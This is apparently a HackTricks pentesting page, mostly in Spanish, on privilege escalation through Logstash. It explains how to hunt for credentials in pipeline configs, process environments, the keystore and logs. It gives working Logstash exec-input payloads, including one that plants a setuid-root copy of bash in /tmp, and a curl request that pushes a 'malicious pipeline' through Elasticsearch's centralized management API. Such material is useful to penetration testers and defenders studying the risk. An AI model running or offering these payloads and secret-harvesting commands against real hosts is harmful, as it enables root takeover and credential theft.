# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se utiliza para **recopilar, transformar y distribuir logs** a través de un sistema conocido como **pipelines**. Estas pipelines están compuestas por las etapas **input**, **filter** y **output**. Surge un aspecto interesante cuando Logstash funciona en una máquina comprometida.

### Configuración de pipelines

Las pipelines se configuran en el archivo **/etc/logstash/pipelines.yml**, que enumera las ubicaciones de las configuraciones de pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este archivo revela dónde se encuentran los archivos **.conf**, que contienen las configuraciones de pipeline. Cuando se emplea un **Elasticsearch output module**, es común que los **pipelines** incluyan **Elasticsearch credentials**, que a menudo poseen privilegios extensos debido a la necesidad de Logstash de escribir datos en Elasticsearch. Wildcards en las rutas de configuración permiten a Logstash ejecutar todos los pipelines coincidentes en el directorio designado.

Si Logstash se inicia con `-f <directory>` en lugar de `pipelines.yml`, **todos los archivos dentro de ese directorio se concatenan en orden lexicográfico y se parsean como una única configuración**. Esto crea dos implicaciones ofensivas:

- Un archivo añadido como `000-input.conf` o `zzz-output.conf` puede cambiar cómo se ensambla el pipeline final
- Un archivo malformado puede impedir que se cargue todo el pipeline, así que valida los payloads cuidadosamente antes de confiar en el auto-reload

### Fast Enumeration on a Compromised Host

En una máquina donde esté instalado Logstash, inspecciona rápidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
También comprueba si la API de monitoreo local es accesible. Por defecto se enlaza en **127.0.0.1:9600**, lo cual suele ser suficiente después de acceder al host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Esto usually gives you pipeline IDs, runtime details, and confirmation that your modified pipeline has been loaded.

Credentials recovered from Logstash commonly unlock **Elasticsearch**, so check [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Para intentar escalada de privilegios, primero identifica el usuario bajo el cual se está ejecutando el servicio Logstash, típicamente el usuario **logstash**. Asegúrate de cumplir **uno** de estos criterios:

- Poseer **write access** a un archivo de pipeline **.conf** **o**
- El archivo **/etc/logstash/pipelines.yml** usa un wildcard, y puedes escribir en la carpeta objetivo

Adicionalmente, **una** de estas condiciones debe cumplirse:

- Capacidad para reiniciar el servicio Logstash **o**
- El archivo **/etc/logstash/logstash.yml** tiene **config.reload.automatic: true** establecido

Dado un wildcard en la configuración, crear un archivo que coincida con ese wildcard permite la ejecución de comandos. Por ejemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aquí, **interval** determina la frecuencia de ejecución en segundos. En el ejemplo dado, el comando **whoami** se ejecuta cada 120 segundos, con su salida dirigida a **/tmp/output.log**.

Con **config.reload.automatic: true** en **/etc/logstash/logstash.yml**, Logstash detectará y aplicará automáticamente nuevas o modificadas configuraciones de pipeline sin necesidad de reiniciar. Si no hay un wildcard, aún se pueden hacer modificaciones a configuraciones existentes, pero se aconseja precaución para evitar interrupciones.

### Payloads de pipeline más fiables

El plugin de entrada `exec` sigue funcionando en las versiones actuales y requiere ya sea un `interval` o un `schedule`. Se ejecuta mediante **forking** de la JVM de Logstash, por lo que si la memoria es limitada tu payload puede fallar con `ENOMEM` en lugar de ejecutarse silenciosamente.

Un payload de privilege-escalation más práctico suele ser uno que deja un artefacto duradero:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si no tienes permisos para reiniciar pero puedes enviar señales al proceso, Logstash también admite una recarga activada por **SIGHUP** en sistemas tipo Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Ten en cuenta que no todos los plugins son recargables. Por ejemplo, la entrada **stdin** evita la recarga automática, así que no asumas que `config.reload.automatic` siempre aplicará tus cambios.

### Robar secretos de Logstash

Antes de centrarte únicamente en la ejecución de código, recopila los datos a los que Logstash ya tiene acceso:

- Las credenciales en texto plano a menudo están hardcoded dentro de los outputs `elasticsearch {}`, `http_poller`, JDBC inputs, o configuraciones relacionadas con la nube
- Las configuraciones seguras pueden residir en **`/etc/logstash/logstash.keystore`** o en otro directorio `path.settings`
- La contraseña del keystore frecuentemente se suministra a través de **`LOGSTASH_KEYSTORE_PASS`**, y las instalaciones por paquete comúnmente la obtienen desde **`/etc/sysconfig/logstash`**
- La expansión de variables de entorno con `${VAR}` se resuelve al arrancar Logstash, por lo que vale la pena inspeccionar el entorno del servicio

Comprobaciones útiles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Esto también vale la pena comprobar porque **CVE-2023-46672** mostró que Logstash podría registrar información sensible en los logs en circunstancias específicas. En un host post-explotación, los logs antiguos de Logstash y las entradas de `journald` pueden por tanto revelar credenciales incluso si la configuración actual referencia el keystore en lugar de almacenar secretos en línea.

### Abuso de la gestión centralizada de pipelines

En algunos entornos, el host **no** depende en absoluto de archivos locales `.conf`. Si **`xpack.management.enabled: true`** está configurado, Logstash puede obtener pipelines gestionados de forma central desde Elasticsearch/Kibana, y tras habilitar este modo las configs locales de pipeline dejan de ser la fuente de la verdad.

Esto implica una ruta de ataque diferente:

1. Recupera credenciales de Elastic desde la configuración local de Logstash, el keystore o los logs
2. Verifica si la cuenta tiene el privilegio de clúster **`manage_logstash_pipelines`**
3. Crea o reemplaza un pipeline gestionado centralmente para que el host Logstash ejecute tu payload en su próximo intervalo de sondeo

The Elasticsearch API used for this feature is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Esto es especialmente útil cuando los archivos locales son de solo lectura, pero Logstash ya está registrado para obtener pipelines de forma remota.

## References

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
